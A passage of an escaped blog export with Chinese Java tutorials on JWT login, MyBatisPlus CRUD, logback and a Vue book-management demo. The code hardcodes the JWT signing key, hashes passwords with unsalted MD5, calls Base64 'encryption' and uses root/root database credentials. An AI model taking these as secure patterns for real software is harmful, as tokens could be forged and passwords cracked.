tableName=&quot;tb_permissions&quot;&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=&quot;perid&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;/context&gt; &lt;/generatorConfiguration&gt; 创建com.sunzy.fmmall.general.GeneralDao package com.sunzy.fmmall.general; import tk.mybatis.mapper.common.Mapper; import tk.mybatis.mapper.common.MySqlMapper; public interface GeneralDao&lt;T&gt; extends Mapper&lt;T&gt;, MySqlMapper&lt;T&gt; &#123; &#125; 在pom.xml中添加配置文件的位置 使用插件进行代码生成 JWT实现登录权限认证1.导入JWT依赖&lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.10.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; 2.生成对应的token并返回给前端// 验证成功则生成对应的token // 使用jwt生成token JwtBuilder builder = Jwts.builder(); Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key1&quot;, &quot;value2&quot;); map.put(&quot;key2&quot;, &quot;value2&quot;); JwtBuilder jwtBuilder = builder.setSubject(username) //设置subject .setIssuedAt(new Date()) // 设置token生成的时间 .setId(user.getUserId() + &quot;&quot;) // 设置userid为token的唯一id .setClaims(map) // map中可以存放用户的角色和权限信息 .setExpiration(new Date(System.currentTimeMillis() + 24 * 60 * 60 * 1000 * 2)) // 设置token的过期时间 为两天 .signWith(SignatureAlgorithm.HS256, &quot;sunzy123456&quot;);// 设置token的加密方式和加密密钥 String token = jwtBuilder.compact(); // 获取token return new ResultVO(ResStatus.OK, token, user); 3.前端进行登录验证时获取对应的token 4.JWT进行token解析if(token == null || &quot;&quot;.equals(token))&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125;else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // 密钥需要与加密时使用的一致 try&#123; // 如果token正确 且在有效期内 则解析正常否则会出现异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // 获取token中的用户数据 String subject = body.getSubject(); // 获取token中发subject String key1 = body.get(&quot;key1&quot;, String.class); /// 获取添加在map中的值 &#125;catch(UnsupportedJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;token不合法请重新登录！&quot;, null); &#125;catch(ExpiredJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;token已过期，请重新登录！&quot;, null); &#125; catch (Exception e)&#123; return new ResultVO(ResStatus.NO, &quot;未知错误&quot;, null); &#125; 5.使用拦截器验证token 创建拦截器 package com.sunzy.fmmall.interceptor; import com.alibaba.fastjson.JSON; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import io.jsonwebtoken.*; import org.springframework.context.annotation.Configuration; import org.springframework.stereotype.Component; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @Component public class CheckTokenInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String token = request.getParameter(&quot;token&quot;); if (token == null || &quot;&quot;.equals(token)) &#123; doResponse(response, &quot;请先登录！&quot;); return false; &#125; else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // 密钥需要与加密时使用的一致 try &#123; // 如果token正确 且在有效期内 则解析正常否则会出现异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // 获取token中的用户数据 String subject = body.getSubject(); // 获取token中发subject String key1 = body.get(&quot;key1&quot;, String.class); /// 获取添加在map中的值 return true; &#125; catch (UnsupportedJwtException e) &#123; doResponse(response,&quot;token不合法，请重新登录！&quot;); &#125; catch (ExpiredJwtException e) &#123; doResponse(response,&quot;token已过期，请重新登录！&quot;); &#125; catch (Exception e) &#123; doResponse(response,&quot;未知错误！&quot;); &#125; return false; &#125; &#125; private void doResponse(HttpServletResponse response, String msg) throws IOException &#123; ResultVO resultVO = new ResultVO(ResStatus.NO, msg, null); String string = JSON.toJSONString(resultVO); response.setContentType(&quot;application/json&quot;); response.setCharacterEncoding(&quot;utf-8&quot;); PrintWriter writer = response.getWriter(); writer.write(string); writer.flush(); writer.close(); &#125; &#125; 配置拦截器 package com.sunzy.fmmall.config; import com.sunzy.fmmall.interceptor.CheckTokenInterceptor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; /** * 拦截器的配置类 */ @Configuration public class InterceptorConfig implements WebMvcConfigurer &#123; @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) &#123; // registry是拦截器的注册器 // 将自己创建的拦截器加入进来 即可实现拦截功能 registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(&quot;/**&quot;) // 拦截所有路径 .excludePathPatterns(&quot;/user/**&quot;); // 除了用户登录和注册路径 &#125; &#125; 加密使用到工具类1.md5package com.qfedu.fmmall.utils; import java.math.BigInteger; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; //MD5 生成器 public class MD5Utils &#123; public static String md5(String password)&#123; //生成一个md5加密器 try &#123; MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;); //计算MD5 的值 md.update(password.getBytes()); //BigInteger 将8位的字符串 转成16位的字符串 得到的字符串形式是哈希码值 //BigInteger(参数1,参数2) 参数1 是 1为正数 0为0 -1为负数 return new BigInteger(1, md.digest()).toString(16); &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); &#125; return null; &#125; &#125; 2.base64package com.qfedu.fmmall.utils; import java.util.Base64; //base64 加密 解密 激活邮件的时候 为 邮箱地址 code验证码 进行加密 //当 回传回来后 进行邮箱地址 和 code 的解密 public class Base64Utils &#123; //加密 public static String encode(String msg)&#123; return Base64.getEncoder().encodeToString(msg.getBytes()); &#125; //解密 public static String decode(String msg)&#123; return new String(Base64.getDecoder().decode(msg)); &#125; &#125; ​ logback日志添加xml文件在springboot项目的resource目录下创建logback-spring.xml文件 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;appender name=&quot;stdout&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt; &lt;encoder&gt; &lt;springProfile name=&quot;dev&quot;&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=&quot;!dev&quot;&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;!--日志的编码格式--&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name=&quot;timeFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;!--TimeBasedRollingPolicy 基于时间的滚动策略--&gt; &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt; &lt;fileNamePattern&gt;log/log-%d&#123;yyyy-MM-dd-HH&#125;.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss.SSS&#125; %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level=&quot;info&quot;&gt; &lt;appender-ref ref=&quot;stdout&quot;/&gt; &lt;appender-ref ref=&quot;timeFile&quot;/&gt; &lt;/root&gt; &lt;/configuration&gt; 在sercie实现类创建Logger对象，输⼊⽇志 日志会被记录到项目的/log目录下，且是按每日记录 log/log-%d&#123;yyyy-MM-dd-HH&#125;.log","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"springboot_demo","date":"2022-04-17T13:32:46.000Z","path":"2022/04/17/springboot-demo/","text":"springboot demo使用springboot整合SSMP 1.项目需求项目最终实现的页面 ​ 整体案例中需要采用的技术如下： Dao开发————整合MyBatisPlus，制作数据层测试 Service开发————基于MyBatisPlus进行增量开发，制作业务层测试类 Controller开发————基于Restful开发，使用PostMan测试接口功能 Controller开发————前后端开发协议制作 页面开发————基于VUE+ElementUI制作，前后端联调，页面数据处理，页面消息处理 列表 新增 修改 删除 分页 查询 项目异常处理 按条件查询————页面功能调整、Controller修正功能、Service修正功能 2.创建springboot的web项目新建模块File-&gt;new-&gt;module 这里没什么需要改的，只需要修改使用的java版本 选择所需要的依赖，选择后springboot就可以自动导入相关坐标，无需手动导入 ==注意将配置文件改为yml类型== application.yml # 修改配置将tomcat的端口改为80 server: port: 80 3.开发流程实体类开发数据库资源 -- ---------------------------- -- Table structure for tbl_book -- ---------------------------- DROP TABLE IF EXISTS `tbl_book`; CREATE TABLE `tbl_book` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 51 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic; -- ---------------------------- -- Records of tbl_book -- ---------------------------- INSERT INTO `tbl_book` VALUES (1, &#x27;计算机理论&#x27;, &#x27;Spring实战 第5版&#x27;, &#x27;Spring入门经典教程，深入理解Spring原理技术内幕&#x27;); INSERT INTO `tbl_book` VALUES (2, &#x27;计算机理论&#x27;, &#x27;Spring 5核心原理与30个类手写实战&#x27;, &#x27;十年沉淀之作，手写Spring精华思想&#x27;); INSERT INTO `tbl_book` VALUES (3, &#x27;计算机理论&#x27;, &#x27;Spring 5 设计模式&#x27;, &#x27;深入Spring源码剖析Spring源码中蕴含的10大设计模式&#x27;); INSERT INTO `tbl_book` VALUES (4, &#x27;计算机理论&#x27;, &#x27;Spring MVC+MyBatis开发从入门到项目实战&#x27;, &#x27;全方位解析面向Web应用的轻量级框架，带你成为Spring MVC开发高手&#x27;); INSERT INTO `tbl_book` VALUES (5, &#x27;计算机理论&#x27;, &#x27;轻量级Java Web企业应用实战&#x27;, &#x27;源码级剖析Spring框架，适合已掌握Java基础的读者&#x27;); INSERT INTO `tbl_book` VALUES (6, &#x27;计算机理论&#x27;, &#x27;Java核心技术 卷I 基础知识（原书第11版）&#x27;, &#x27;Core Java 第11版，Jolt大奖获奖作品，针对Java SE9、10、11全面更新&#x27;); INSERT INTO `tbl_book` VALUES (7, &#x27;计算机理论&#x27;, &#x27;深入理解Java虚拟机&#x27;, &#x27;5个维度全面剖析JVM，大厂面试知识点全覆盖&#x27;); INSERT INTO `tbl_book` VALUES (8, &#x27;计算机理论&#x27;, &#x27;Java编程思想（第4版）&#x27;, &#x27;Java学习必读经典,殿堂级著作！赢得了全球程序员的广泛赞誉&#x27;); INSERT INTO `tbl_book` VALUES (9, &#x27;计算机理论&#x27;, &#x27;零基础学Java（全彩版）&#x27;, &#x27;零基础自学编程的入门图书，由浅入深，详解Java语言的编程思想和核心技术&#x27;); INSERT INTO `tbl_book` VALUES (10, &#x27;市场营销&#x27;, &#x27;直播就该这么做：主播高效沟通实战指南&#x27;, &#x27;李子柒、李佳琦、薇娅成长为网红的秘密都在书中&#x27;); INSERT INTO `tbl_book` VALUES (11, &#x27;市场营销&#x27;, &#x27;直播销讲实战一本通&#x27;, &#x27;和秋叶一起学系列网络营销书籍&#x27;); INSERT INTO `tbl_book` VALUES (12, &#x27;市场营销&#x27;, &#x27;直播带货：淘宝、天猫直播从新手到高手&#x27;, &#x27;一本教你如何玩转直播的书，10堂课轻松实现带货月入3W+&#x27;); tbl_book对应的实体类如下 import lombok.Data; @Data // Data注解可以可以完成所有属性的setter getter toString，equals，hashCode方法 public class Book &#123; private Integer id; private String type; private String name; private String description; &#125; 为了方便开发使用lombok注解，在pom.xml添加坐标 &lt;dependencies&gt; &lt;!--lombok--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 数据层开发-CRUD(1) 导入mybatisplus、数据源、mysql驱动的坐标&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; (2)在application.xml中配置数据源信息 spring: datasource: druid: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/javastudy?serverTimezone=UTC username: root password: root ==若连接数据库出现时区错误时可以加上参数?serverTimezone=UTC== (3)使用MyBatisPlus的标准通用接口BaseMapper加速开发@Mapper public interface BookDao extends BaseMapper&lt;Book&gt; &#123; &#125; ==注意== 对数据库操作时需要指定数据表的前缀，并设置主键增加的策略，这里使用自增 mybatis-plus: global-config: db-config: table-prefix: tbl_ #设置表名通用前缀 id-type: auto #设置主键id字段的生成策略为参照数据库设定的策略，当前数据库设置id生成策略为自增 设置mybatisPlus的日志显示格式 在进行数据层测试的时候，因为基础的CRUD操作均由MyBatisPlus给我们提供了，所以就出现了一个局面，开发者不需要书写SQL语句了，这样程序运行的时候总有一种感觉，一切的一切都是黑盒的，作为开发者我们啥也不知道就完了。如果程序正常运行还好，如果报错了，这个时候就很崩溃，你甚至都不知道从何下手，因为传递参数、封装SQL语句这些操作完全不是你开发出来的，所以查看执行期运行的SQL语句就成为当务之急。 可以添加日志配置 mybatis-plus: global-config: db-config: table-prefix: tbl_ id-type: auto configuration: # 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl 数据层开发-分页功能Mybatis-plus中已经实现了分页功能的API，具体使用方法如下 创建Page对象，利用构造方法实例化所需的参数currentPage，pageSize 使用Mapper.selectPage()使用分页查询功能 IPage page = new Page(2,5); IPage page = bookDao.selectPage(page, null); 使用分页查询返回的结果仍是Page类型，其中包含多条数据，并且使用返回的结果可以获取到分页的详细信息，包括当前页，总记录数，当前页记录数，前一页等 @Test void testGetPage()&#123; IPage page = new Page(2,5); bookDao.selectPage(page, null); System.out.println(page.getCurrent()); //当前页码值 System.out.println(page.getSize()); //每页显示数 System.out.println(page.getTotal()); //数据总量 System.out.println(page.getPages()); //总页数 System.out.println(page.getRecords()); //详细数据 &#125; 但是在使用分页功能时需要设置一个拦截器，基础操作中有查询全部的功能，而在这个基础上只需要升级一下（PLUS）就可以得到分页操作。所以MyBatisPlus将分页操作做成了一个开关，你用分页功能就把开关开启，不用就不需要开启这个开关。而我们现在没有开启这个开关，所以分页操作是没有的。这个开关是通过MyBatisPlus的拦截器的形式存在的。 @Configuration public class MPConfig &#123; @Bean public MybatisPlusInterceptor mybatisPlusInterceptor()&#123; MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor()); // 当需要其他的拦截器时继续addInnerInterceptor即可 // 如果后期开发其他功能，需要添加全新的拦截器，按照第二行的格式继续add进去新的拦截器就可以了。 return interceptor; &#125; &#125; 数据层开发-条件查询MyBatisPlus将这些操作都制作成API接口，调用一个又一个的方法就可以实现各种条件的拼装。使用方法如下 @Test void testGetBy()&#123; QueryWrapper&lt;Book&gt; qw = new QueryWrapper&lt;&gt;(); qw.like(&quot;name&quot;,&quot;Spring&quot;); bookDao.selectList(qw); &#125; 其中第一句QueryWrapper对象是一个用于封装查询条件的对象，该对象可以动态使用API调用的方法添加条件，最终转化成对应的SQL语句。第二句就是一个条件了，需要什么条件，使用QueryWapper对象直接调用对应操作即可。上述代码中执行的SQL语句为select * from tbl_book where name like &#39;%spring%&#39;，MP自动对查询条件进行处理，省去了手动处理的一步。 MyBatisPlus针对字段检查进行了功能升级，全面支持Lambda表达式，就有了下面这组API。由QueryWrapper对象升级为LambdaQueryWrapper对象，其使用方法如下： @Test void testGetBy2()&#123; String name = &quot;1&quot;; LambdaQueryWrapper&lt;Book&gt; lqw = new LambdaQueryWrapper&lt;Book&gt;(); lqw.like(Book::getName,name); bookDao.selectList(lqw); &#125; 为了便于开发者动态拼写SQL，防止将null数据作为条件使用，MyBatisPlus还提供了动态拼装SQL的快捷书写方式。 @Test void testGetBy2()&#123; String name = &quot;1&quot;; LambdaQueryWrapper&lt;Book&gt; lqw = new LambdaQueryWrapper&lt;Book&gt;(); //if(name != null) lqw.like(Book::getName,name); //方式一：JAVA代码控制 lqw.like(name != null,Book::getName,name); //方式二：API接口提供控制开关 bookDao.selectList(lqw); &#125; 业务层开发定义业务层的接口BookService package com.sunzy.service; import com.baomidou.mybatisplus.core.metadata.IPage; import com.sunzy.domain.Book; import java.util.List; public interface BookService &#123; boolean save(Book book); boolean update(Book book); boolean delete(Integer id); List&lt;Book&gt; getAll(); Book getById(Integer id); IPage&lt;Book&gt; getPage(int currentPage, int pageSize); &#125; 业务层接口的实现类 package com.sunzy.service.impl; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.dao.BookDao; import com.sunzy.domain.Book; import com.sunzy.service.BookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.util.List; // 注册为数据逻辑层的bean @Service public class BookServiceImpl2 implements BookService &#123; @Autowired private BookDao bookDao; @Override public boolean save(Book book) &#123; return bookDao.insert(book) &gt; 0; &#125; @Override public boolean update(Book book) &#123; return bookDao.updateById(book) &gt; 0; &#125; @Override public boolean delete(Integer id) &#123; return bookDao.deleteById(id) &gt; 0; &#125; @Override public List&lt;Book&gt; getAll() &#123; return bookDao.selectList(null); &#125; @Override public Book getById(Integer id) &#123; return bookDao.selectById(id); &#125; @Override public IPage&lt;Book&gt; getPage(int currentPage, int pageSize) &#123; IPage&lt;Book&gt; page = new Page&lt;&gt;(currentPage, pageSize); return bookDao.selectPage(page, null); &#125; &#125; 使用mybatisplus的自带接口快速开发 业务层接口快速开发 public interface IBookService extends IService&lt;Book&gt; &#123; //添加非通用操作API接口 &#125; ​ 业务层接口实现类快速开发，关注继承的类需要传入两个泛型，一个是数据层接口，另一个是实体类。 @Service public class BookServiceImpl extends ServiceImpl&lt;BookDao, Book&gt; implements IBookService &#123; @Autowired private BookDao bookDao; //添加非通用操作API &#125; ​ 如果感觉MyBatisPlus提供的功能不足以支撑你的使用需要（其实是一定不能支撑的，因为需求不可能是通用的），在原始接口基础上接着定义新的API接口就行了，此处不再说太多了，就是自定义自己的操作了，但是不要和已有的API接口名冲突即可。 总结 使用通用接口（ISerivce）快速开发Service 使用通用实现类（ServiceImpl&lt;M,T&gt;）快速开发ServiceImpl 可以在通用接口基础上做功能重载或功能追加 注意重载时不要覆盖原始操作，避免原始提供的功能丢失 表现层开发表现层接口如下： package com.sunzy.controller; import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.domain.Book; import com.sunzy.service.IBookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.*; import java.util.List; //使用restful接口约束 @RestController @RequestMapping(&quot;/books&quot;) public class BookController2 &#123; @Autowired private IBookService service; @GetMapping public List&lt;Book&gt; getAll()&#123; return service.list(); &#125; @PostMapping public boolean save(@RequestBody Book book)&#123; System.out.println(book); return service.save(book); &#125; @PutMapping public boolean update(@RequestBody Book book)&#123; LambdaQueryWrapper&lt;Book&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.eq(Book::getId, book.getId()); return service.update(book,wrapper); &#125; @DeleteMapping(&quot;&#123;id&#125;&quot;) public boolean delete(@PathVariable int id)&#123; return service.removeById(id); &#125; @GetMapping(&quot;&#123;id&#125;&quot;) public Book getById(@PathVariable int id )&#123; return service.getById(id); &#125; @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) public IPage&lt;Book&gt; getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123; Page&lt;Book&gt; page = new Page&lt;&gt;(currentPage, pageSize); return service.page(page); &#125; &#125; 使用postman测试各个接口是否可以正常工作 getById功能 分页功能 save()功能 删除功能delete() ==消息一致性处理== @Data public class R &#123; private Boolean flag; //表示本次请求是否成功 private Object data; //本次请求返回的数据 &#125; 使用消息一致处理后获取的数据格式 &#123; &quot;flag&quot;: true, &quot;data&quot;:&#123; &quot;id&quot;: 1, &quot;type&quot;: &quot;计算机理论&quot;, &quot;name&quot;: &quot;Spring实战 第5版&quot;, &quot;description&quot;: &quot;Spring入门经典教程&quot; &#125; &#125; 修改表现层代码 package com.sunzy.controller; import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.sunzy.controller.utils.R; import com.sunzy.domain.Book; import com.sunzy.service.IBookService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; import java.util.List; @RestController @RequestMapping(&quot;/books&quot;) public class BookController &#123; @Autowired private IBookService service; @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) public R getAll(@PathVariable int currentPage, @PathVariable int pageSize, Book book)&#123; IPage&lt;Book&gt; bookIPage = service.getAll(currentPage, pageSize, book); if(currentPage &gt; bookIPage.getPages()) &#123; bookIPage = service.getAll((int) bookIPage.getPages(), pageSize, book); &#125; return new R(null != bookIPage, bookIPage); &#125; @PostMapping public R save(@RequestBody Book book)&#123; return new R(service.save(book)); &#125; @PutMapping public R update(@RequestBody Book book)&#123; LambdaQueryWrapper&lt;Book&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.eq(Book::getId, book.getId()); return new R(service.update(book,wrapper)); &#125; @DeleteMapping(&quot;&#123;id&#125;&quot;) public R delete(@PathVariable int id)&#123; return new R(service.removeById(id)); &#125; @GetMapping(&quot;&#123;id&#125;&quot;) public R getById(@PathVariable int id )&#123; return new R(true, service.getById(id)); &#125; // @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;) // public R getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123; // Page&lt;Book&gt; ipage = new Page&lt;&gt;(currentPage, pageSize); // Page&lt;Book&gt; page = service.page(ipage); // // if(currentPage &gt; page.getCurrent())&#123; // ipage.setCurrent(page.getPages()); // page = service.page(ipage); // &#125; // return new R(true, page); // &#125; &#125; 前端页面代码分页查询所有数据和条件查询页面数据模型定义 data:&#123; dataList: [], //当前页要展示的列表数据 pagination: &#123; //分页相关模型数据 currentPage: 1,//当前页码 pageSize:10, //每页显示的记录数 total:0, //总记录数 name:&#x27;&#x27;, type:&#x27;&#x27;, description:&#x27;&#x27; &#125; &#125; 异步请求代码 getAll() &#123; param = &quot;?name=&quot; + this.pagination.name; param = param + &quot;&amp;type=&quot; + this.pagination.type; param = param + &quot;&amp;description=&quot; + this.pagination.description; // console.log(param); axios.get(&quot;/books/&quot;+this.pagination.currentPage + &quot;/&quot; + this.pagination.pageSize + param).then((res)=&gt;&#123; this.dataList = res.data.data.records; this.pagination.total = res.data.data.total; this.pagination.currentPage = res.data.data.current; this.pagination.pagesize = res.data.data.size; &#125;); &#125; 在钩子函数中执行该方法 //钩子函数，VUE对象初始化完成后自动执行 created() &#123; this.getAll(); &#125;, 添加数据添加数据的窗口弹出控制 数据模型 dialogFormVisible: false,//添加表单是否可见 formData 对话框控制函数 //弹出添加窗口 handleCreate() &#123; this.dialogFormVisible = true; this.resetForm(); &#125;, 重置表单功能 //重置表单 resetForm() &#123; this.formData = &#123;&#125;; &#125;, 添加功能 handleAdd () &#123; axios.post(&quot;/books&quot;, this.formData).then((res) =&gt; &#123; if(res.data.flag)&#123; this.dialogFormVisible = false; this.$message.success(&quot;添加成功！&quot;); &#125;else&#123; this.$message.error(&quot;添加失败！&quot;); &#125; &#125;).finally(() =&gt; &#123; this.getAll(); &#125;) &#125; 删除数据// 删除 handleDelete(row) &#123; axios.delete(&quot;/books/&quot; + row.id).then((res)=&gt;&#123; if(res.data.flag)&#123; this.$message.success(&quot;删除成功！&quot;); this.getAll(); &#125;else&#123; this.$message.error(&quot;删除失败！&quot;); &#125; &#125;) &#125;, 修改数据//弹出编辑窗口 handleUpdate(row) &#123; this.dialogFormVisible4Edit = true; this.formData = row; &#125;, //修改 handleEdit() &#123; axios.put(&quot;/books&quot;, this.formData).then((res) =&gt; &#123; if(res.data.flag)&#123; this.dialogFormVisible4Edit = false; this.$message.success(&quot;修改成功！&quot;); &#125;else&#123; this.$message.error(&quot;修改失败！&quot;); &#125; &#125;).finally(() =&gt; &#123; this.getAll(); &#125;) &#125;,","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"javaweb","date":"2022-03-30T05:08:56.000Z","path":"2022/03/30/javaweb/","text":"Javaweb基础项目学完 javaweb 做的小项目 综合案例需求与准备今日目标： 能够完成查询所有功能 能够完成添加功能 能够理解 BaseServlet 思想 能够完成批量删除功能 能够完成分页查询功能 能够完成条件查询功能 1，功能介绍 以上是我们在综合案例要实现的功能。对数据的除了对数据的增删改查功能外，还有一些复杂的功能，如 批量删除、分页查询、条件查询 等功能 批量删除 功能：每条数据前都有复选框，当我选中多条数据并点击 批量删除 按钮后，会发送请求到后端并删除数据库中指定的多条数据。 分页查询 功能：当数据库中有很多数据时，我们不可能将所有的数据展示在一页里，这个时候就需要分页展示数据。 条件查询 功能：数据库量大的时候，我们就需要精确的查询一些想看到的数据，这个时候就需要通过条件查询。 这里的 修改品牌 和 删除品牌 功能在课程上不做讲解，留作同学来下的练习。 2，环境准备环境准备我们主要完成以下两件事即可 将资料的 brand-case 模块导入到 idea中 执行资料中提供的 tb_brand.sql脚本 在没有资料的情况下在idea中创建maven的web项目可以使用下面的方法 file -&gt; new -&gt; module-&gt;Maven-&gt;Create from archetype-&gt;maven archetype-&gt;next 2.1 工程准备将 04-资料\\01-初始工程 中的 brand-case 工程导入到我们自己的 idea 中。工程结构如下： 2.2 创建表下面是创建表的语句 -- 删除tb_brand表 drop table if exists tb_brand; -- 创建tb_brand表 create table tb_brand ( -- id 主键 id int primary key auto_increment, -- 品牌名称 brand_name varchar(20), -- 企业名称 company_name varchar(20), -- 排序字段 ordered int, -- 描述信息 description varchar(100), -- 状态：0：禁用 1：启用 status int ); -- 添加数据 insert into tb_brand (brand_name, company_name, ordered, description, status) values (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;三只松鼠&#x27;, &#x27;三只松鼠股份有限公司&#x27;, 5, &#x27;好吃不上火&#x27;, 0), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, 